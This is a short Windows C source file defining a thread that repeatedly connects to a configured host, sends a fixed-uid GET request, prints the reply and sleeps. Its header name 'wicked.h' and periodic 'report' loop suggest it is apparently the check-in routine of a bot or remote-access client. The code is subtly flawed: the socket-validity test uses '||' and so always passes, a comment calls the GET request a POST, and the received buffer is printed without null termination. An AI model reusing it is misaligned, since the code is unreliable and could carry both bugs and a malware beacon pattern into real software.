#include <Windows.h>
#include <stdio.h>

#include "wicked.h"
#include "config.h"
#include "http.h"
#include "socket.h"

DWORD WINAPI http_thread(LPVOID param)
{
	http_data_s http;
	char	    buffer[512];
	int         r = 0;

	http.report = true;

	while (http.report)
	{
		/* Connect to HTTP server */
		http.sock = create_tcp_socket(config->host, config->port);

		if (http.sock != INVALID_SOCKET || http.sock != SOCKET_ERROR)
		{
			/* Send the POST request */
			if (send_tcp_data(http.sock, "GET /%s?uid=123 HTTP/1.1\r\nHost: %s\r\n\r\n", config->page, config->host))
			{
				/* Receive request data */
				r = recv(http.sock, buffer, sizeof(buffer), 0);
				if (r >= 1)
				{
					printf("received http data: \n%s\n", buffer);
				}
			}
		}

		/* Close connection */
		closesocket(http.sock);

		Sleep(config->report_sleep_time);
	}

	return 0;
}
